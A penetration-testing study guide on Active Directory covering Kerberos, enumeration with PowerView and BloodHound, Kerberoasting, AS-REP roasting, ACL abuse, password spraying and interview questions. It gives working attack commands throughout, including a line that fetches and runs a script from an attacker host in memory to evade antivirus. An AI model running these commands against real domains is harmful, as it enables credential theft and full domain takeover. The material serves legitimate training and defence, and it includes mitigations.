# Active Directory

!!! info "Why This Matters"
    Active Directory is the backbone of virtually every enterprise Windows network. Understanding AD attack paths is what separates a network pentester from someone who just runs Nmap. Every internal pentest eventually becomes an AD assessment. Interviewers probe AD depth relentlessly at mid-level and above.

---

## Active Directory Architecture

### Core Components

**Domain:** The primary administrative unit. A logical grouping of objects (users, computers, groups) sharing a security database. Identified by a DNS name: `corp.example.com`.

**Domain Controller (DC):** The server hosting AD DS (Active Directory Domain Services). Stores the AD database (`ntds.dit`), handles Kerberos and NTLM authentication, enforces Group Policy, and replicates with peer DCs. The DC is the highest-value target in an AD environment — compromise it = compromise everything.

**ntds.dit:** The Active Directory database file. Located at `C:\Windows\NTDS\ntds.dit` on DCs. Contains all AD objects including user accounts and their NTLM password hashes. Getting ntds.dit = all domain credentials.

**Forest:** Collection of one or more domains sharing a schema, configuration partition, and global catalog. Domains within a forest automatically trust each other (transitive trust). The forest is the true security boundary in AD — not the domain.

**Organizational Units (OUs):** Containers for organizing AD objects. Group Policy Objects (GPOs) are linked to OUs.

**Trust:** Relationship allowing authentication across domain/forest boundaries.
- **Within forest:** Two-way transitive trust (automatic)
- **Cross-forest:** Must be explicitly configured; can be one-way or two-way
- **External trust:** To specific domains outside the forest

### AD Object Types

| Object | Description | Pentest Relevance |
|--------|-------------|-------------------|
| User | Individual account | Credential target, Kerberoasting (if SPN set) |
| Computer | Machine account | Can also be Kerberoasted, used in delegation attacks |
| Group | Collection of users/computers | Group membership = privilege map |
| GPO | Group Policy Object | Misconfig → local admin on machines in scope |
| OU | Container | GPO targeting |
| Service Principal Name (SPN) | Service identifier | Kerberoasting target |

---

## Kerberos — The Complete Mechanism

Kerberos is the primary authentication protocol in AD. Understanding it mechanically is essential for understanding every AD attack.

### Components

- **KDC (Key Distribution Center):** Runs on DC. Has two services:
  - **AS (Authentication Service):** Handles initial authentication
  - **TGS (Ticket Granting Service):** Issues service tickets

- **Tickets:**
  - **TGT (Ticket Granting Ticket):** Obtained from AS after initial login. Proves identity to KDC. Encrypted with `krbtgt` account's hash. Valid 10 hours by default.
  - **TGS (Service Ticket / Service Ticket):** Obtained from TGS using TGT. Grants access to a specific service. Encrypted with the service account's hash.

### Authentication Flow

```
Step 1: AS-REQ (Authentication Service Request)
User → KDC (AS):
  "I am Alice. I want a TGT."
  Includes: timestamp encrypted with Alice's password hash

Step 2: AS-REP (Authentication Service Reply)  
KDC (AS) → User:
  "Here's your TGT." [if Alice's hash decrypts the timestamp correctly]
  TGT: encrypted with krbtgt hash (Alice cannot read it)
  Session key: encrypted with Alice's hash (Alice can read it)

Step 3: TGS-REQ (Ticket Granting Service Request)
User → KDC (TGS):
  "I want to access MSSQL service. Here's my TGT."
  Includes TGT + authenticator (timestamp encrypted with session key)

Step 4: TGS-REP (Ticket Granting Service Reply)
KDC (TGS) → User:
  "Here's your service ticket for MSSQL."
  Service ticket: encrypted with MSSQL service account's hash
  New session key: for user ↔ service communication

Step 5: AP-REQ (Application Request)
User → Service (MSSQL):
  "Here's my service ticket."
  Service decrypts with its own hash → gets session key and user identity
  Service never contacts KDC to validate — it trusts the ticket from the KDC

Step 6: AP-REP (Optional — Mutual Authentication)
Service → User: "I decrypted your ticket. I am authentic."
```

**Key insight:** The KDC doesn't validate *which* service a ticket is used for — the service validates it itself. This enables Kerberoasting and Golden/Silver ticket attacks.

### Kerberos Security Flags

| Flag | Meaning | Security Implication |
|------|---------|---------------------|
| forwardable | TGT can be forwarded to other services | Used in delegation attacks |
| renewable | Ticket can be renewed without re-authentication | Long-lived tickets (10h default, up to 7 days renewable) |
| pre-authentication | User must prove identity before getting TGT | Disabled = AS-REP Roasting |

---

## AD Enumeration — Post-Authentication

Once you have any domain credentials (even a low-privilege user), extensive enumeration is possible.

### PowerView (PowerShell)

```powershell
# Import
. .\PowerView.ps1
Import-Module PowerView

# Domain information
Get-Domain
Get-DomainPolicy
(Get-DomainPolicy).SystemAccess    # Password policy
(Get-DomainPolicy).KerberosPolicy  # Kerberos ticket lifetime

# Users
Get-DomainUser                     # All domain users
Get-DomainUser -SPN                # Users with SPN (Kerberoasting targets)
Get-DomainUser | Select samaccountname, description  # Check descriptions for passwords!
Get-DomainUser -UACFilter DONT_REQUIRE_PREAUTH      # AS-REP Roasting targets

# Groups
Get-DomainGroup                    # All groups
Get-DomainGroupMember "Domain Admins"  # Who's in Domain Admins?
Get-DomainGroupMember "Administrators"

# Computers
Get-DomainComputer                 # All computers
Get-DomainComputer -OperatingSystem "*Server 2008*"  # Old, potentially vulnerable

# GPOs
Get-GPO -All                       # All GPOs
Get-DomainGPO
Get-DomainGPOLocalGroup            # GPOs that add users to local groups

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "domain users"}

# Logged-on users (requires local admin on target)
Get-NetLoggedon -ComputerName workstation01

# Session information
Get-NetSession -ComputerName dc01

# Find where Domain Admins are logged in
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### BloodHound — Attack Path Mapping

BloodHound visualizes AD relationships and finds attack paths to Domain Admin.

```bash
# SharpHound — data collector (run on domain-joined machine or with creds)
# GUI collection:
SharpHound.exe -c All

# Or from Linux with BloodHound.py (remote collection)
bloodhound-python -d corp.local -u user -p password -c All -ns dc-ip

# Output: ZIP file containing JSON files
# Import into BloodHound UI

# Key BloodHound queries:
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Find Computers where Domain Users are Local Admin"
# "Find AS-REP Roastable Users"
# "Find Kerberoastable Users with most privileges"
# "List all Kerberoastable Accounts"
# "Users with Foreign Domain Group Membership"
```

**BloodHound relationship types to understand:**

| Relationship | Meaning | Exploitation |
|-------------|---------|-------------|
| MemberOf | User is member of group | Inherit group privileges |
| AdminTo | Principal has local admin on computer | Lateral movement |
| HasSession | User has active session on computer | Token theft if local admin |
| CanRDP | Principal can RDP to computer | Remote access |
| GenericAll | Full control over object | Modify, reset password, add members |
| GenericWrite | Write properties | Set SPN for Kerberoasting, modify logon script |
| WriteOwner | Can change object owner | Take ownership → GenericAll |
| WriteDACL | Can modify ACL | Grant self GenericAll |
| ForceChangePassword | Can reset user's password | Account takeover |
| AllExtendedRights | All extended rights | Reset password, Kerberoasting |
| AddMember | Can add members to group | Add self to privileged group |
| DCSync | Replication rights on DC | DCSync attack = extract all hashes |

---

## Kerberoasting

**Concept:** Any authenticated domain user can request a service ticket (TGS) for any SPN. The service ticket is encrypted with the service account's NTLM hash. Offline cracking of the ticket reveals the service account's plaintext password.

**Why it works:** The KDC doesn't check if the requesting user is authorized to use the service — it only checks that the TGT is valid. The authorization check happens at the service. So any user can get any service ticket.

**Impact:** Service accounts often have high privileges (sometimes Domain Admin) and often have weak, non-expiring passwords. Cracking them gives persistent privileged access.

```bash
# Find Kerberoastable accounts (have SPNs set)
# PowerView:
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

# Impacket's GetUserSPNs.py (from Linux):
GetUserSPNs.py -dc-ip 192.168.1.10 corp.local/user:password
GetUserSPNs.py -dc-ip 192.168.1.10 corp.local/user:password -request  # Get tickets
GetUserSPNs.py -dc-ip 192.168.1.10 corp.local/user:password -outputfile kerberoast.txt

# Rubeus (from Windows):
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Hash format: $krb5tgs$23$*... (RC4-encrypted) or $krb5tgs$18$... (AES256)
# RC4 hashes crack much faster than AES256

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /wordlists/rockyou.txt      # RC4
hashcat -m 19700 kerberoast.txt /wordlists/rockyou.txt      # AES256
hashcat -m 13100 kerberoast.txt /wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Mitigation:** 
- Use strong, random passwords (25+ characters) for service accounts
- Prefer Managed Service Accounts (MSA/gMSA) — automatically managed passwords
- Use AES encryption for Kerberos (reduces cracking speed)
- Monitor for unusual TGS requests (many SPNs from one user in short time)

---

## AS-REP Roasting

**Concept:** By default, Kerberos requires pre-authentication — the client must prove identity (via timestamp encrypted with password hash) before the AS issues a TGT. If pre-authentication is *disabled* for a user account (via `DONT_REQUIRE_PREAUTH` flag), anyone can request a TGT for that user. The TGT contains data encrypted with the user's hash — crackable offline.

**Key difference from Kerberoasting:** Requires no prior authentication. Works even without credentials (if you can send AS-REQ packets to the DC).

```bash
# Find AS-REP roastable users

# PowerView (requires domain user):
Get-DomainUser -UACFilter DONT_REQUIRE_PREAUTH | Select samaccountname

# Impacket (from Linux, no credentials needed if user list known):
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10

# With credentials (enumerate first, then request):
GetNPUsers.py corp.local/user:password -dc-ip 192.168.1.10 -request -outputfile asrep.txt

# Rubeus (from Windows, domain-joined or with creds):
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Hash format: $krb5asrep$23$user@domain:...
# Crack:
hashcat -m 18200 asrep.txt /wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Mitigation:** Enable Kerberos pre-authentication for all accounts. The `DONT_REQUIRE_PREAUTH` flag is never required for normal user accounts.

---

## ACL Abuse

Active Directory objects have Access Control Lists. Misconfigured ACLs grant one principal excessive control over another — creating attack paths that BloodHound maps visually.

### GenericAll / GenericWrite

```powershell
# If you have GenericAll over a user → reset their password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewP@ss1" -AsPlainText -Force)

# If you have GenericAll over a group → add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members currentuser

# If you have GenericWrite over a user → set SPN → Kerberoast them
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/FAKESERVICE'}
# Now Kerberoast targetuser
Get-DomainSPNTicket targetuser
```

### WriteDACL

```powershell
# If you have WriteDACL over an object → grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity currentuser
```

### ForceChangePassword

```powershell
# If you have ForceChangePassword over a user → reset their password without knowing current
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewP@ss1" -AsPlainText -Force) -Verbose
```

### Shadow Credentials (KeyCredentialLink)

```powershell
# If you have GenericWrite or AllExtendedRights over a computer/user object:
# Add a shadow credential (certificate) → authenticate as that object

# Using Whisker:
Whisker.exe add /target:dc01$
# Returns: certificate + Rubeus command to authenticate as dc01$
# Use the computer account to DCSync
```

---

## Password Spraying in AD

```bash
# Kerberos pre-auth spraying (stealthier — fewer events)
kerbrute passwordspray -d corp.local users.txt 'Summer2024!'

# LDAP spraying
ldapdomaindump -u 'corp\user' -p password dc-ip

# CrackMapExec spraying
cme smb dc-ip -u users.txt -p 'Password123' --continue-on-success

# Finding the lockout threshold before spraying
crackmapexec smb dc-ip -u user -p pass --pass-pol
# Or: net accounts /domain (from Windows)
```

---

## AD Privilege Levels and Why They Matter

Understanding privilege levels helps prioritize attack paths:

| Account/Group | Privilege | Attack Path Impact |
|--------------|-----------|-------------------|
| Domain Users | Basic domain access | Starting point for enumeration |
| Local Administrators | Admin on specific machines | Lateral movement, credential dumping |
| Domain Admins | Full control of domain | Game over — can DCSync, access all machines |
| Enterprise Admins | Forest-level control | Even higher than DA (only needed for forest ops) |
| Schema Admins | Modify AD schema | Targeted, rarely needed |
| Backup Operators | Backup/restore any file | Can backup ntds.dit |
| Account Operators | Create/modify most accounts | Can add members to many groups |
| Server Operators | Control services on DCs | Service manipulation on DCs |
| krbtgt account | Used to encrypt all Kerberos tickets | Compromise → Golden Ticket |
| LAPS admin | Read local admin passwords from AD | Local admin on all machines managed by LAPS |

---

## PowerView — Complete Enumeration Reference

PowerView is the gold standard for manual AD enumeration from PowerShell. Know these commands well — they come up in technical interviews.

```powershell
# Import (from memory, bypass AV detection)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
# Or from disk:
. .\PowerView.ps1

# === Domain Information ===
Get-Domain                          # Current domain info
Get-DomainController                # List all DCs
Get-DomainController -Domain other.corp.local  # DCs in another domain
Get-DomainPolicy                    # Domain security policy
(Get-DomainPolicy).SystemAccess     # Password policy
(Get-DomainPolicy).KerberosPolicy   # Kerberos ticket lifetimes

# === User Enumeration ===
Get-DomainUser                                    # All users (every attribute)
Get-DomainUser -Identity alice                    # Specific user
Get-DomainUser | Select samaccountname            # Just usernames
Get-DomainUser | Select samaccountname,description # Username + description
# Passwords often stored in description field:
Get-DomainUser | Where-Object {$_.description -ne $null} | Select samaccountname,description

# Users with SPN set (Kerberoasting targets)
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# Users without preauth required (AS-REP Roasting targets)
Get-DomainUser -UACFilter DONT_REQUIRE_PREAUTH | Select samaccountname

# Admin count (protected by AdminSDHolder)
Get-DomainUser -AdminCount | Select samaccountname

# Users with password never expires
Get-DomainUser -UACFilter PASSWORD_NEVER_EXPIRES | Select samaccountname

# Recently created accounts (potential backdoor accounts)
Get-DomainUser | Where-Object {$_.whencreated -gt (Get-Date).AddDays(-30)} | Select samaccountname,whencreated

# === Group Enumeration ===
Get-DomainGroup                                   # All groups
Get-DomainGroup -Identity "Domain Admins"         # Specific group
Get-DomainGroupMember "Domain Admins"             # DA members (recursive)
Get-DomainGroupMember "Domain Admins" -Recurse    # Nested group expansion

# High-value groups to check membership:
$highvalue = @("Domain Admins","Enterprise Admins","Schema Admins",
               "Administrators","Backup Operators","Account Operators",
               "Server Operators","Print Operators","Remote Desktop Users",
               "Group Policy Creator Owners","DNSAdmins")
foreach ($g in $highvalue) {
    $members = Get-DomainGroupMember $g -Recurse 2>$null
    if ($members) { Write-Host "$g : $($members.Count) members" }
}

# === Computer Enumeration ===
Get-DomainComputer                                # All computers
Get-DomainComputer | Select name,operatingsystem  # Name + OS
Get-DomainComputer -OperatingSystem "*2008*"      # Find old/vulnerable OS
Get-DomainComputer -Unconstrained                 # Machines with unconstrained delegation

# === GPO Enumeration ===
Get-DomainGPO                                     # All GPOs
Get-DomainGPO | Select displayname,gpcfilesyspath # GPO names + paths
Get-DomainGPOLocalGroup                           # GPOs that add to local groups (privesc)
Get-DomainGPOComputerLocalGroupMapping            # Which computers affected by local group GPO

# === OU Enumeration ===
Get-DomainOU                                      # All OUs
Get-DomainOU -Properties name,gplink              # OU + linked GPOs

# === Trust Enumeration ===
Get-DomainTrust                                   # Trusts for current domain
Get-DomainTrust -Domain other.corp.local
Get-ForestTrust                                   # All forest trusts
Get-ForestDomain                                  # All domains in forest

# === ACL Enumeration ===
# Find interesting ACLs — what rights do we have on other objects?
Get-DomainObjectAcl -Identity "alice" -ResolveGUIDs  # ACL on specific user

# Find all ACEs where we have rights
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -match "domain users" -or
    $_.IdentityReferenceName -match "authenticated users"
}

# Find where specific user has rights
$sid = (Get-DomainUser alice).objectsid
Get-DomainObjectAcl -Domain corp.local -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -eq $sid -and
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"
}

# === Session and Logon Information ===
# Where are admins logged in? (requires local admin or appropriate rights)
Get-NetLoggedon -ComputerName fileserver01        # Currently logged-on users
Get-NetSession -ComputerName dc01                 # Active sessions

# Find DA sessions across the network
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
# This queries all machines — noisy, use carefully

# Find where specific user is logged in
Find-DomainUserLocation -UserIdentity alice
```

---

## Active Directory Interview Questions — Mid-Level

**"What is the difference between Kerberos and NTLM authentication in AD?"**

Kerberos is the primary authentication protocol in modern AD environments. It uses tickets — after initial authentication to the KDC, a user receives a TGT (Ticket Granting Ticket) which they present to get service tickets for specific resources. Kerberos supports mutual authentication (both client and server prove identity), enforces time synchronization (5-minute skew tolerance), and is the basis of attacks like Kerberoasting, Golden Ticket, and delegation abuse.

NTLM is a challenge-response protocol used as a fallback — when Kerberos fails (not domain-joined, direct IP access, some cross-domain scenarios). The server sends a challenge; the client responds with a function of the NT hash and the challenge. NTLM doesn't support mutual authentication and is the basis of relay attacks (Responder, ntlmrelayx) because the hash response can be relayed to other systems.

Security implication: NTLM relay attacks work because NTLM doesn't authenticate the target — an attacker can intercept an NTLM authentication attempt and relay it to a different server. Kerberos prevents this because tickets are bound to the specific target service.

**"What does BloodHound actually do under the hood?"**

SharpHound (the data collector) queries Active Directory via LDAP to enumerate users, groups, computers, GPOs, OUs, and their relationships. It then queries individual computers to identify active sessions and local administrators (where it has permission). All this data is stored as nodes and edges in a Neo4j graph database.

BloodHound's interface runs Cypher queries against this graph to find attack paths. When you run "Find Shortest Paths to Domain Admins," it's executing a Cypher shortest-path algorithm across the relationship graph. The power is in the relationship modeling — it can find chains like "User A → is member of Group B → Group B has GenericWrite on User C → User C can be Kerberoasted → cracked hash allows lateral movement to Server D → D has session of Domain Admin E."

**"How do you identify a Kerberoastable account and is it always exploitable?"**

A Kerberoastable account has a Service Principal Name (SPN) set. Any authenticated domain user can request a service ticket for any SPN, and that ticket is encrypted with the service account's NTLM hash. Offline cracking of the ticket recovers the plaintext password.

It's not always exploitable because: (1) if the service account password is strong (25+ random characters), cracking is computationally infeasible even with GPU clusters; (2) if the account uses AES encryption (AES256 tickets are dramatically slower to crack than RC4); (3) if the account's password was recently rotated, you'd need to re-crack after rotation.

High-value Kerberoastable targets: service accounts that are also members of privileged groups (sometimes DA or server admin), accounts running production services with weak passwords for "compatibility" reasons, accounts that haven't had passwords changed in years.

**"You found a machine with Unconstrained Delegation. What can you do with it?"**

With local admin on a machine with Unconstrained Delegation enabled, I can:

1. Monitor for incoming TGTs from users who authenticate to this machine
2. Coerce a Domain Controller to authenticate to this machine using techniques like PrinterBug (MS-RPRN) or PetitPotam (MS-EFSRPC)
3. When the DC authenticates, its TGT arrives in memory on my machine
4. Extract the DC TGT from LSASS memory
5. Use the DC machine account TGT to perform DCSync, extracting all domain hashes

The key is step 2 — coercing authentication from the DC. Several Windows services respond to connection requests that trigger authentication from the DC to the attacker-controlled machine. This turns Unconstrained Delegation on any machine into a path to full domain compromise.

---

## Common Mid-Level AD Findings in Assessments

| Finding | How Found | Severity | Fix |
|---------|-----------|----------|-----|
| Kerberoastable service accounts with weak passwords | GetUserSPNs.py + hashcat | High | Strong passwords / gMSA |
| Users with DONT_REQUIRE_PREAUTH | GetNPUsers.py | High | Enable preauth |
| Unconstrained delegation on non-DC machines | BloodHound | Critical | Remove delegation or restrict |
| GenericAll/GenericWrite on privileged objects | BloodHound | High–Critical | Remove excessive ACLs |
| Password in user description field | PowerView | High | Clear description, change password |
| Admin count users with weak passwords | Get-DomainUser -AdminCount | High | Enforce strong passwords |
| NTLM relay via LLMNR poisoning | Responder | High | Disable LLMNR/NBT-NS |
| SMB signing not required | nxc smb --gen-relay-list | High | Enable SMB signing via GPO |
| Stale admin accounts (no recent logon) | lastLogon attribute | Medium | Disable/remove stale accounts |
| Nested group escalation (user → group → DA) | BloodHound | High | Review group membership |
